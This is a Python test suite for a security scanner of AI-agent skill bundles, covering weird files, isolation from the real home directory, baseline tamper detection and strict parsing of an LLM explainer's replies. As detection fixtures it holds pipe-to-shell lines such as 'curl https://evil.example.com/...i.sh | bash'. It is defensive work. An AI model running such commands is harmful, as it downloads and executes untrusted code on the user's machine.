"""Adversarial robustness: weird files, hermeticity, baseline integrity, strict parsing.

The extractor runs first, trusted, over bytes somebody else chose. So the questions this
file asks are not "does the rule fire" but "can the input make the scanner hang, crash,
lie, or read something it was told not to read".

* **Weird files.** A named pipe blocks forever on ``open()``. A character device streams
  without end. A socket raises. A directory nobody can list disappears silently from
  ``os.walk``. Each of those has to become a NOT-FULLY-ANALYZED row, not a hang and not a
  gap.
* **Hermeticity.** ``--home DIR`` is the whole basis of the test suite's honesty. This
  file proves it by instrumenting ``open()`` during an in-process scan and asserting that
  nothing under the real ``~/.claude``, ``~/.malskill`` or the Claude Desktop config
  location is touched.
* **Baseline integrity.** The self-checksum has to reject every shape of edit, and the
  scanner has to say so instead of reporting "no drift".
* **Strict parsing.** The explainer may only escalate, and only in the exact protocol.
"""

from __future__ import annotations

import atexit
import builtins
import io
import json
import os
import shutil
import socket
import stat
import sys
import tempfile
import time
import unittest
from typing import Any, Dict, List, Tuple

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import harness  # noqa: E402

_WORKDIR = tempfile.mkdtemp(prefix="malskill-robust-")
atexit.register(shutil.rmtree, _WORKDIR, True)

SKILL = (
    "---\n"
    "name: {name}\n"
    "description: Reformats notes into a consistent Markdown layout.\n"
    "allowed-tools: Read, Write\n"
    "---\n"
    "\n"
    "# {name}\n"
    "\n"
    "Ordinary body text.\n"
)


def _write(path: str, text: str) -> str:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as handle:
        handle.write(text)
    return path


def _slot(name: str) -> str:
    root = os.path.join(_WORKDIR, name)
    if os.path.isdir(root):
        shutil.rmtree(root, ignore_errors=True)
    os.makedirs(root)
    return root


def _bundle(slot: str, name: str = "notes") -> Tuple[str, str]:
    root = _slot(slot)
    bundle = os.path.join(root, name)
    _write(os.path.join(bundle, "SKILL.md"), SKILL.format(name=name))
    return bundle, harness.make_home(root, "home")


# --------------------------------------------------------------------------------------
# Weird files
# --------------------------------------------------------------------------------------


class WeirdFileTests(unittest.TestCase):
    """Nothing on disk may hang the scan or vanish from the report."""

    def scan(self, bundle: str, home: str, timeout: int = 60) -> Tuple[Any, Dict[str, Any]]:
        result = harness.run_malskill(
            ["scan", "--home", home, "--paths", bundle, "--json", "--no-baseline"],
            timeout=timeout,
        )
        if result.returncode not in (0, 1):
            raise AssertionError("scanner did not complete:{}".format(result))
        return result, json.loads(result.stdout)

    def test_named_pipe_does_not_hang_the_scan(self) -> None:
        bundle, home = _bundle("fifo")
        fifo = os.path.join(bundle, "stream.log")
        try:
            os.mkfifo(fifo)
        except (AttributeError, OSError) as exc:  # pragma: no cover - platform dependent
            self.skipTest("mkfifo unavailable: {}".format(exc))
        # A 60 s cap: if the scanner opens the FIFO for reading with no writer, it blocks
        # forever and this is the assertion that catches it.
        result, report = self.scan(bundle, home)
        files = [str(e.get("file", "")) for e in harness.unscanned(report)]
        self.assertTrue(
            any("stream.log" in name for name in files),
            "a named pipe must be reported as unreadable, not skipped: {}{}".format(
                files, result
            ),
        )
        self.assertEqual([], harness.finding_ids(report), str(result))

    def test_unix_socket_is_reported_not_crashed_on(self) -> None:
        bundle, home = _bundle("socket")
        path = os.path.join(bundle, "agent.sock")
        try:
            server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            server.bind(path)
            self.addCleanup(server.close)
        except (AttributeError, OSError) as exc:  # pragma: no cover - platform dependent
            self.skipTest("unix sockets unavailable: {}".format(exc))
        result, report = self.scan(bundle, home)
        files = [str(e.get("file", "")) for e in harness.unscanned(report)]
        self.assertTrue(
            any("agent.sock" in name for name in files), "{}{}".format(files, result)
        )
        self.assertNotIn("Traceback", result.stderr, str(result))

    def test_character_device_symlink_is_not_streamed(self) -> None:
        """A link to /dev/zero would otherwise be hashed until the disk fills."""
        bundle, home = _bundle("chardev")
        link = os.path.join(bundle, "assets", "blob.bin")
        os.makedirs(os.path.dirname(link), exist_ok=True)
        if not os.path.exists("/dev/zero"):  # pragma: no cover - platform dependent
            self.skipTest("/dev/zero unavailable")
        os.symlink("/dev/zero", link)
        result, report = self.scan(bundle, home)
        files = [str(e.get("file", "")) for e in harness.unscanned(report)]
        self.assertTrue(
            any("blob.bin" in name for name in files),
            "a link out of the bundle to a device node must be reported: {}{}".format(
                files, result
            ),
        )

    def test_unreadable_directory_is_loud_not_silent(self) -> None:
        bundle, home = _bundle("locked-dir")
        locked = os.path.join(bundle, "private")
        os.makedirs(locked)
        _write(os.path.join(locked, "notes.md"), "# notes\n")
        try:
            os.chmod(locked, 0o000)
        except OSError:  # pragma: no cover - platform dependent
            self.skipTest("chmod unavailable")
        self.addCleanup(lambda: os.chmod(locked, 0o755))
        if os.access(locked, os.R_OK):  # running as root
            self.skipTest("test runner can read anything")
        result, report = self.scan(bundle, home)
        entries = harness.unscanned(report)
        self.assertTrue(
            any("private" in str(e.get("file", "")) for e in entries),
            "a directory that could not be listed must appear in NOT-FULLY-ANALYZED: "
            "{}{}".format([e.get("file") for e in entries], result),
        )

    def test_unreadable_file_is_loud_not_silent(self) -> None:
        bundle, home = _bundle("locked-file")
        locked = _write(os.path.join(bundle, "secret.md"), "# locked\n")
        try:
            os.chmod(locked, 0o000)
        except OSError:  # pragma: no cover
            self.skipTest("chmod unavailable")
        if os.access(locked, os.R_OK):
            self.skipTest("test runner can read anything")
        _result, report = self.scan(bundle, home)
        self.assertTrue(
            any("secret.md" in str(e.get("file", "")) for e in harness.unscanned(report))
        )

    def test_enormous_frontmatter_does_not_stall_or_crash(self) -> None:
        bundle, home = _bundle("huge-frontmatter")
        block = "\n".join("key%d: value %d" % (i, i) for i in range(40000))
        skill_path = os.path.join(bundle, "SKILL.md")
        _write(
            skill_path,
            "---\nname: huge\ndescription: A bundle with a pathological frontmatter "
            "block.\n" + block + "\n---\n\n# Huge\n\nBody.\n",
        )
        budget = float(os.environ.get("MALSKILL_PERF_BUDGET_S", "5"))
        started = time.perf_counter()
        result, report = self.scan(bundle, home, timeout=60)
        elapsed = time.perf_counter() - started
        self.assertLess(
            elapsed,
            budget,
            "scan took {:.3f}s; budget is {:.3f}s from MALSKILL_PERF_BUDGET_S".format(
                elapsed, budget
            ),
        )
        self.assertIn(result.returncode, (0, 1), str(result))
        self.assertNotIn("Traceback", result.stderr, str(result))
        self.assertIsInstance(report.get("stats"), dict)
        files = [str(entry.get("file", "")) for entry in harness.unscanned(report)]
        self.assertTrue(
            any(name == "SKILL.md" or name.endswith("/SKILL.md") for name in files),
            "{} must appear in NOT-FULLY-ANALYZED: {}{}".format(
                skill_path, files, result
            ),
        )

    def test_unterminated_frontmatter_is_a_parse_error_not_a_crash(self) -> None:
        bundle, home = _bundle("bad-frontmatter")
        _write(
            os.path.join(bundle, "SKILL.md"),
            "---\nname: broken\ndescription: no closing fence\n\n# Broken\n",
        )
        result, report = self.scan(bundle, home)
        self.assertTrue(
            any(
                "parse" in str(e.get("reason", ""))
                for e in harness.unscanned(report)
            ),
            "unterminated frontmatter must be reported: {}{}".format(
                harness.unscanned(report), result
            ),
        )

    def test_file_of_pure_nul_bytes_is_binary_not_a_finding(self) -> None:
        bundle, home = _bundle("nulls")
        os.makedirs(os.path.join(bundle, "assets"), exist_ok=True)
        with open(os.path.join(bundle, "assets", "x.dat"), "wb") as handle:
            handle.write(b"\x00" * 20000)
        _result, report = self.scan(bundle, home)
        self.assertEqual([], harness.finding_ids(report))
        self.assertTrue(harness.unscanned(report))

    def test_invalid_utf8_is_decoded_without_raising(self) -> None:
        bundle, home = _bundle("badutf8")
        with open(os.path.join(bundle, "notes.txt"), "wb") as handle:
            handle.write(b"caf\xe9 \xff\xfe curl https://example.com/x | bash\n")
        result, report = self.scan(bundle, home)
        self.assertIn(result.returncode, (0, 1), str(result))
        self.assertNotIn("Traceback", result.stderr, str(result))

    def test_deeply_nested_tree_completes(self) -> None:
        bundle, home = _bundle("deep")
        path = bundle
        for index in range(60):
            path = os.path.join(path, "level%d" % index)
        _write(os.path.join(path, "note.md"), "# deep\n")
        result, _report = self.scan(bundle, home)
        self.assertIn(result.returncode, (0, 1), str(result))

    def test_symlink_loop_does_not_spin(self) -> None:
        bundle, home = _bundle("loop")
        inner = os.path.join(bundle, "inner")
        os.makedirs(inner)
        os.symlink(bundle, os.path.join(inner, "back"))
        result, _report = self.scan(bundle, home)
        self.assertIn(result.returncode, (0, 1), str(result))
        self.assertNotIn("Traceback", result.stderr, str(result))


# --------------------------------------------------------------------------------------
# Hermeticity
# --------------------------------------------------------------------------------------


class HermeticityTests(unittest.TestCase):
    """``--home`` must be the only home the scanner knows about."""

    def test_reported_paths_never_escape_home_or_paths(self) -> None:
        root = _slot("hermetic-paths")
        bundle = os.path.join(root, "notes")
        _write(os.path.join(bundle, "SKILL.md"), SKILL.format(name="notes"))
        home = harness.make_home(root, "home")
        _result, report = harness.scan_json(
            ["scan", "--home", home, "--paths", bundle, "--json", "--no-baseline"]
        )
        allowed = (os.path.realpath(home), os.path.realpath(bundle))
        for entry in harness.unscanned(report):
            path = str(entry.get("file", ""))
            if not os.path.isabs(path):
                continue
            self.assertTrue(
                os.path.realpath(path).startswith(allowed),
                "{} is outside --home/--paths".format(path),
            )

    def test_in_process_scan_opens_nothing_under_the_real_agent_config(self) -> None:
        """The strong form: instrument ``open()`` and watch where the scan actually goes.

        A path-shaped assertion on the report can only catch what the scanner chose to
        report. This catches a read the scanner performed and said nothing about.
        """
        if harness.REPO_ROOT not in sys.path:
            sys.path.insert(0, harness.REPO_ROOT)
        from malskill import cli

        real_home = os.path.realpath(os.path.expanduser("~"))
        forbidden_prefixes = tuple(
            os.path.join(real_home, part)
            for part in (
                ".claude",
                ".claude.json",
                ".malskill",
                ".cursor",
                ".codex",
                os.path.join("Library", "Application Support", "Claude"),
            )
        )

        root = _slot("hermetic-open")
        home = harness.make_home(root, "home")
        # Populate the fake home so discovery has something to do.
        skills = os.path.join(home, ".claude", "skills", "notes")
        _write(os.path.join(skills, "SKILL.md"), SKILL.format(name="notes"))
        _write(
            os.path.join(home, ".claude.json"),
            json.dumps({"mcpServers": {"docs": {"command": "uvx", "args": ["docs@1.0.0"]}}}),
        )

        opened: List[str] = []
        original_open = builtins.open

        def recording_open(file, *args, **kwargs):  # type: ignore[no-untyped-def]
            try:
                opened.append(os.path.realpath(os.fspath(file)))
            except TypeError:  # file descriptors
                pass
            return original_open(file, *args, **kwargs)

        builtins.open = recording_open
        try:
            buffer = io.StringIO()
            code = cli.main(
                ["scan", "--home", home, "--json", "--no-baseline", "--all-clients",
                 "--cwd", root],
                stdout=buffer,
                stderr=io.StringIO(),
            )
        finally:
            builtins.open = original_open

        self.assertIn(code, (0, 1))
        json.loads(buffer.getvalue())
        leaks = [p for p in opened if p.startswith(forbidden_prefixes)]
        self.assertEqual(
            [],
            leaks,
            "a scan run with --home read the real machine's agent configuration: "
            "{}".format(sorted(set(leaks))[:10]),
        )

    def test_baseline_path_follows_home(self) -> None:
        root = _slot("hermetic-baseline")
        home = harness.make_home(root, "home")
        skills = os.path.join(home, ".claude", "skills", "notes")
        _write(os.path.join(skills, "SKILL.md"), SKILL.format(name="notes"))
        result = harness.run_malskill(["baseline", "update", "--home", home])
        self.assertEqual(0, result.returncode, str(result))
        self.assertTrue(
            os.path.isfile(os.path.join(home, ".malskill", "baseline.json")),
            "the baseline store must live under --home.{}".format(result),
        )

    def test_paths_scan_does_not_perform_home_discovery(self) -> None:
        root = _slot("hermetic-nodiscovery")
        home = harness.make_home(root, "home")
        planted = os.path.join(home, ".claude", "skills", "planted")
        harness.copy_fixture("malicious", "pipe_to_shell", planted)
        bundle = os.path.join(root, "notes")
        _write(os.path.join(bundle, "SKILL.md"), SKILL.format(name="notes"))
        _result, report = harness.scan_json(
            ["scan", "--home", home, "--paths", bundle, "--json", "--no-baseline"]
        )
        self.assertEqual(
            [],
            harness.finding_ids(report),
            "--paths alone must not also scan the home tree",
        )


# --------------------------------------------------------------------------------------
# Baseline integrity
# --------------------------------------------------------------------------------------


class BaselineIntegrityTests(unittest.TestCase):
    """Every shape of edit to the store must be refused, loudly."""

    def _prepared_home(self, slot: str) -> str:
        root = _slot(slot)
        home = harness.make_home(root, "home")
        skills = os.path.join(home, ".claude", "skills", "notes")
        _write(os.path.join(skills, "SKILL.md"), SKILL.format(name="notes"))
        result = harness.run_malskill(["baseline", "update", "--home", home])
        self.assertEqual(0, result.returncode, str(result))
        return home

    def _store_path(self, home: str) -> str:
        return os.path.join(home, ".malskill", "baseline.json")

    def _scan(self, home: str) -> Tuple[Any, Dict[str, Any]]:
        return harness.scan_json(["scan", "--home", home, "--json"], cwd=home)

    def test_hand_edited_hash_is_detected(self) -> None:
        home = self._prepared_home("bl-edit")
        path = self._store_path(home)
        with open(path, "r", encoding="utf-8") as handle:
            data = json.load(handle)
        for entry in data["targets"].values():
            for rel in list(entry.get("files", {})):
                entry["files"][rel] = "0" * 64
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(data, handle)
        _result, report = self._scan(home)
        self.assertIn("BASELINE_TAMPERED", harness.finding_ids(report))

    def test_removed_checksum_is_detected(self) -> None:
        home = self._prepared_home("bl-nochecksum")
        path = self._store_path(home)
        with open(path, "r", encoding="utf-8") as handle:
            data = json.load(handle)
        data.pop("self_checksum", None)
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(data, handle)
        _result, report = self._scan(home)
        self.assertIn("BASELINE_TAMPERED", harness.finding_ids(report))

    def test_added_key_is_detected(self) -> None:
        """The checksum covers the whole document, not just the targets object."""
        home = self._prepared_home("bl-extrakey")
        path = self._store_path(home)
        with open(path, "r", encoding="utf-8") as handle:
            data = json.load(handle)
        data["updated"] = "1999-01-01T00:00:00+0000"
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(data, handle)
        _result, report = self._scan(home)
        self.assertIn("BASELINE_TAMPERED", harness.finding_ids(report))

    def test_truncated_store_is_detected(self) -> None:
        home = self._prepared_home("bl-truncated")
        path = self._store_path(home)
        with open(path, "r", encoding="utf-8") as handle:
            text = handle.read()
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(text[: len(text) // 2])
        _result, report = self._scan(home)
        self.assertIn("BASELINE_TAMPERED", harness.finding_ids(report))

    def test_a_tampered_store_suppresses_drift_reporting(self) -> None:
        """Never report 'no drift' against a store that cannot be trusted."""
        home = self._prepared_home("bl-suppress")
        path = self._store_path(home)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write("{")
        _result, report = self._scan(home)
        ids = harness.finding_ids(report)
        self.assertIn("BASELINE_TAMPERED", ids)
        self.assertNotIn("BASELINE_DRIFT", ids)
        self.assertNotIn("BASELINE_NEW_TARGET", ids)

    def test_store_is_written_with_restrictive_permissions(self) -> None:
        home = self._prepared_home("bl-perms")
        mode = stat.S_IMODE(os.stat(self._store_path(home)).st_mode)
        self.assertEqual(
            0o600,
            mode,
            "the baseline records what is installed; it should not be world-readable",
        )


# --------------------------------------------------------------------------------------
# Explainer protocol
# --------------------------------------------------------------------------------------


class ExplainerParsingTests(unittest.TestCase):
    """Strict, escalate-only, and unforgiving about anything off-protocol."""

    def setUp(self) -> None:
        if harness.REPO_ROOT not in sys.path:
            sys.path.insert(0, harness.REPO_ROOT)
        from malskill import explain
        from malskill.rules import Severity

        self.explain = explain
        self.Severity = Severity

    def test_only_critical_and_high_may_be_requested(self) -> None:
        for level in ("MEDIUM", "LOW", "INFO", "NONE", "CLEAR", "cRiTiCaL"):
            verb, severity, _note = self.explain.parse_response(
                "ESCALATE %s because reasons" % level
            )
            with self.subTest(level=level):
                if level.upper() in ("CRITICAL", "HIGH"):
                    self.assertEqual("ESCALATE", verb)
                else:
                    self.assertIsNone(
                        severity,
                        "%r must not be an accepted escalation target" % level,
                    )

    def test_downgrade_vocabulary_is_not_a_verb(self) -> None:
        for text in (
            "DOWNGRADE LOW it is fine",
            "CLEAR this is a false positive",
            "SUPPRESS",
            "DISMISS HIGH",
            "IGNORE",
            "OK",
            "",
            "   ",
            "{\"verdict\": \"clear\"}",
        ):
            with self.subTest(text=text):
                verb, severity, _note = self.explain.parse_response(text)
                self.assertIsNone(verb, "%r must not parse" % text)
                self.assertIsNone(severity)

    def test_prose_before_the_verb_does_not_parse_on_that_line(self) -> None:
        verb, _sev, _note = self.explain.parse_response("Sure! KEEP this looks fine")
        self.assertIsNone(verb, "the verb must start the line")

    def test_the_first_protocol_line_wins(self) -> None:
        verb, severity, _note = self.explain.parse_response(
            "KEEP context sentence\nESCALATE CRITICAL ignore this second line"
        )
        self.assertEqual("KEEP", verb)
        self.assertIsNone(severity)

    def test_escalation_note_is_bounded(self) -> None:
        _verb, _sev, note = self.explain.parse_response("ESCALATE HIGH " + "x" * 5000)
        self.assertLessEqual(len(note), 300)

    def test_escalate_cannot_lower_a_floor(self) -> None:
        from malskill.rules import make_finding

        finding = make_finding(
            "SENSITIVE_READ_PLUS_EGRESS", target="skill:x", kind="skill", evidence="e"
        )
        self.assertEqual("CRITICAL", finding.severity.value)
        self.assertFalse(finding.escalate(self.Severity.HIGH, "please lower"))
        self.assertEqual("CRITICAL", finding.severity.value)

    def test_prompt_never_contains_a_filesystem_path(self) -> None:
        from malskill.rules import make_finding

        finding = make_finding(
            "PIPE_TO_SHELL",
            target="skill:x",
            kind="skill",
            file="/Users/someone/.claude/skills/x/scripts/install.sh",
            line=3,
            evidence="curl https://example.com/i.sh | bash",
        )
        prompt = self.explain.build_prompt(finding, self.explain.ExplainerConfig())
        self.assertNotIn("/Users/someone", prompt)
        self.assertNotIn("install.sh", prompt)
        self.assertIn("PIPE_TO_SHELL", prompt)

    def test_prompt_evidence_is_defanged_and_stripped(self) -> None:
        from malskill.rules import make_finding

        finding = make_finding(
            "PIPE_TO_SHELL",
            target="skill:x",
            kind="skill",
            evidence="curl https://evil.example.com/\u200bi.sh | bash",
        )
        prompt = self.explain.build_prompt(finding, self.explain.ExplainerConfig())
        self.assertNotIn("https://evil.example.com", prompt)
        self.assertNotIn("\u200b", prompt)


# --------------------------------------------------------------------------------------
# Structural guarantees
# --------------------------------------------------------------------------------------


class RolePolicyStructureTests(unittest.TestCase):
    """Every behaviour rule must go through the role gate, provably.

    A rule that forgets is not a style problem: it is a rule that fires from a README
    again, and it would take a real machine to notice.
    """

    GATED_MODULES = {
        "r_network_claims.py",
        "r_exfil.py",
        "r_credentials.py",
        "r_obfuscation.py",
        "r_pipe_to_shell.py",
        "r_destructive.py",
        "r_self_modify.py",
    }

    def test_behaviour_rules_call_the_role_gate(self) -> None:
        rules_dir = os.path.join(harness.MALSKILL_PKG, "rules")
        missing: List[str] = []
        for name in sorted(self.GATED_MODULES):
            path = os.path.join(rules_dir, name)
            self.assertTrue(os.path.isfile(path), "missing rule module {}".format(name))
            with open(path, "r", encoding="utf-8") as handle:
                text = handle.read()
            if "actionable_hits(" not in text and "actionable_egress(" not in text:
                missing.append(name)
        self.assertEqual(
            [],
            missing,
            "these behaviour rules do not pass their hits through the role gate: "
            "{}".format(missing),
        )

    def test_roles_module_imports_only_stdlib(self) -> None:
        import ast

        path = os.path.join(harness.MALSKILL_PKG, "roles.py")
        with open(path, "r", encoding="utf-8") as handle:
            tree = ast.parse(handle.read(), filename=path)
        for node in ast.walk(tree):
            if isinstance(node, ast.ImportFrom):
                self.assertFalse(
                    (node.module or "").startswith("malskill"),
                    "roles.py must not import from the package: it has to stay outside "
                    "every import cycle",
                )

    def test_every_role_has_a_report_label(self) -> None:
        if harness.REPO_ROOT not in sys.path:
            sys.path.insert(0, harness.REPO_ROOT)
        from malskill import roles

        for role in roles.FileRole:
            self.assertIn(role, roles.ROLE_LABELS)


if __name__ == "__main__":
    unittest.main()
